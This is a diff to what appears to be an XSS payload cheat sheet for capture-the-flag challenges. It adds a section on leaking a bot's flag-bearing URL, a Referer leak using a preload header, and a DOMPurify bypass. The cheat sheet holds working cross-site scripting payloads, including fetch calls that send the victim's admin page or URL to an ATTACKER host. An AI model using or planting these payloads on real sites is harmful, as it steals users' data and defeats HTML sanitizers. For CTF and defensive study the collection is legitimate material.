@@ -17,7 +17,7 @@
 -->This is a 1 line comment, but "-->" must to be at the beggining of the lin
 ```
 
-## Payloads
+## Pop Alert
 
 ```html
 <svg/onload=alert(1)>
@@ -53,6 +53,33 @@
 <script>fetch('/admin').then(r=>r.text()).then(x=>fetch('https://ATTACKER/',{method:'POST',body:x}))</script>
 ```
 
+## Bot URL Flag
+
+Use when the bot appends the flag to the visited URL.
+
+```js
+fetch("https://ATTACKER/?u=" + encodeURIComponent(location.href))
+fetch("https://ATTACKER/?q=" + encodeURIComponent(location.search))
+```
+
+Leak via Referer when script is blocked but images/preload work:
+
+```html
+<img src="https://ATTACKER/seed.png">
+```
+
+Attacker response:
+
+```http
+Link: <https://ATTACKER/leak.png>; rel=preload; as=image; referrerpolicy=unsafe-url
+```
+
+## DOMPurify
+
+```html
+<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
+```
+
 ## Parentheses Filtered
 
 ```html
@@ -86,7 +113,7 @@ url("HOOK?data=a");display: block !important; }
 
 ```
 
-## Style Events Payloads
+## CSS And Events
 
 ```html
 <div oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
